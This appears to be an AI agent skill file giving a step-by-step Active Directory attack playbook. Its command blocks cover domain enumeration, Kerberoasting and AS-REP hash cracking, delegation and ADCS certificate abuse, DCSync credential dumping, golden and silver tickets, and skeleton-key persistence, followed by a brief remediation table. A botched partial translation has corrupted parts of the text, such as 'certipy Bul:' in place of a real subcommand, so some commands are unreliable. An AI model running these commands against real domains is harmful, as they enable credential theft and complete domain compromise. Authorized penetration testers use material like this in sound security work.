---
name: performing-active-directory-penetration-test
description: Conduct a focused Active Directory penetration test to enumerate domain objects, discover attack paths with BloodHound, exploit Kerberos weaknesses, escalate privileges via ADCS/DCSync, and
  demonstrate domain compromise.
tags:
- BloodHound
- Kerberoasting
- Impacket
- fetih
- domain-compromise
- privilege-escalation
- ADCS
- cybersecurity
- penetration-testing
- DCSync
- active-directory
- siber-güvenlik
triggers:
- active
- authentication
- certificate
- directory
- dns
- endpoint
- exploit
- hash
- http
- incident
- log
- network
category: penetration-testing
source_subdomain: penetration-testing
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
adapted_for: fetih
---

# Performing Active Directory Penetration Test


## Genel Bakış

Active Directory (AD) penetration testing targets the central identity and access management system used by over 95% of Fortune 500 companies. The test identifies misconfigurations, weak credentials, dangerous delegation settings, vulnerable certificate templates, and attack paths that enable an attacker to escalate from a standard domain user to Domain Admin or Enterprise Admin.


## Ne Zaman Kullanılır

- conducting yaparken security assessments that involve performing active directory penetration test
- following yaparken: incident response procedures for related security events
- performing yaparken scheduled security testing or auditing activities
- validating yaparken security controls through hands-on testing

## Ön Gereksinimler

- Standard domain user credentials (minimum starting point)
- Network Erişim: domain controllers (LDAP/389, Kerberos/88, SMB/445, DNS/53)
- Tools: BloodHound, Impacket, Certipy, Rubeus, NetExec, Mimikatz
- Kali Linux or Windows attack machine with domain access

## Phase 1 — AD Enumeration

### Domain Information Gathering

```bash
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --groups
netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local --users

ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "OU=Domain Controllers,DC=corp,DC=local" "(objectClass=computer)" dNSHostName

netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --trusts

netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --pass-pol

netexec smb 10.0.0.5 -u 'testuser' -p 'Password123' --gpp-passwords

ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" \
  dNSHostName

ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(&(objectCategory=user)(msds-allowedtodelegateto=*))" \
  sAMAccountName msds-allowedtodelegateto

netexec ldap 10.0.0.5 -u 'testuser' -p 'Password123' -d corp.local -M laps
```

### BloodHound Attack Path Analysis

```bash
bloodhound-python -u 'testuser' -p 'Password123' -d corp.local \
  -ns 10.0.0.5 -c all --zip

.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

sudo neo4j start
bloodhound --no-sandbox

```

### Service Account Discovery

```bash
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5

impacket-GetNPUsers 'corp.local/' -usersfile domain_users.txt \
  -dc-ip 10.0.0.5 -format hashcat

ldapsearch -x -H ldap://10.0.0.5 -D "testuser@corp.local" -w "Password123" \
  -b "DC=corp,DC=local" "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership
```

## Phase 2 — Kerberos Attacks

### Kerberoasting

```bash
impacket-GetUserSPNs 'corp.local/testuser:Password123' -dc-ip 10.0.0.5 \
  -outputfile kerberoast.txt -request

hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule --force

.\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_tgs.txt
```

### AS-REP Roasting

```bash
impacket-GetNPUsers 'corp.local/' -usersfile users.txt -dc-ip 10.0.0.5 \
  -outputfile asrep.txt -format hashcat

hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberos Delegation Attacks

```bash
.\Rubeus.exe monitor /interval:5 /nowrap
.\SpoolSample.exe DC01.corp.local YOURHOST.corp.local
.\Rubeus.exe ptt /ticket:<base64_ticket>

impacket-getST 'corp.local/svc_web:WebPass123' -spn 'CIFS/fileserver.corp.local' \
  -dc-ip 10.0.0.5 -impersonate administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@fileserver.corp.local' -k -no-pass

impacket-addcomputer 'corp.local/testuser:Password123' -computer-name 'EVIL$' \
  -computer-pass 'EvilPass123' -dc-ip 10.0.0.5
python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' \
  -dc-ip 10.0.0.5 'corp.local/testuser:Password123'
impacket-getST 'corp.local/EVIL$:EvilPass123' -spn 'CIFS/target.corp.local' \
  -impersonate administrator -dc-ip 10.0.0.5
```

## Phase 3 — ADCS (Active Directory Certificate Services) Attacks

```bash
certipy Bul: -u 'testuser@corp.local' -p 'Password123' -dc-ip 10.0.0.5 \
  -vulnerable -stdout

certipy req -u 'testuser@corp.local' -p 'Password123' \
  -target ca.corp.local -ca CORP-CA \
  -template VulnerableWebServer -upn administrator@corp.local

certipy auth -pfx administrator.pfx -dc-ip 10.0.0.5


certipy req -u 'testuser@corp.local' -p 'Password123' \
  -target ca.corp.local -ca CORP-CA \
  -template User -upn administrator@corp.local

certipy relay -target 'http://ca.corp.local/certsrv/certfnsh.asp' \
  -template DomainController
```

## Phase 4 — Domain Privilege Escalation

### DCSync Attack

```bash
impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' -just-dc

impacket-secretsdump 'corp.local/domainadmin:DAPass@10.0.0.5' \
  -just-dc-user krbtgt

mimikatz# lsadump::dcsync /domain:corp.local /user:krbtgt
```

### Golden Ticket

```bash
impacket-ticketer -nthash <krbtgt_nthash> -domain-sid S-1-5-21-... \
  -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec 'corp.local/administrator@dc01.corp.local' -k -no-pass

mimikatz# kerberos::golden /user:administrator /domain:corp.local \
  /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

### Silver Ticket

```bash
impacket-ticketer -nthash <service_nthash> -domain-sid S-1-5-21-... \
  -domain corp.local -spn MSSQL/sqlserver.corp.local administrator

export KRB5CCNAME=administrator.ccache
impacket-mssqlclient 'corp.local/administrator@sqlserver.corp.local' -k -no-pass
```

## Phase 5 — Persistence Demonstration

```bash
mimikatz# privilege::debug
mimikatz# misc::skeleton


```

## Bul:ings and Remediation

| Bul:ing | CVSS | Remediation |
|---------|------|-------------|
| Kerberoastable accounts with weak passwords | 7.5 | Use gMSA, enforce 25+ char passwords for service accounts |
| Unconstrained delegation on servers | 8.1 | Remove unconstrained delegation, use constrained or RBCD |
| Vulnerable ADCS templates (ESC1-ESC8) | 9.8 | Audit templates, remove dangerous permissions, require approval |
| DCSync permissions on non-DA accounts | 9.8 | Audit replication rights, implement tiered admin model |
| LLMNR/NBT-NS enabled | 8.1 | Disable via GPO |
| No LAPS Dağıtılmış | 7.2 | Dağıt: Windows LAPS for local admin management |
| Weak domain password policy | 6.5 | Enforce 14+ chars, implement fine-grained password policies |

## References

- BloodHound: https://github.com/BloodHoundAD/BloodHound
- Impacket: https://github.com/fortra/impacket
- Certipy: https://github.com/ly4k/Certipy
- HackTricks AD: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- SpecterOps AD Security: https://specterops.io/blog/
- MITRE ATT&CK: https://attack.mitre.org/

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: b2e461715532770e
-->

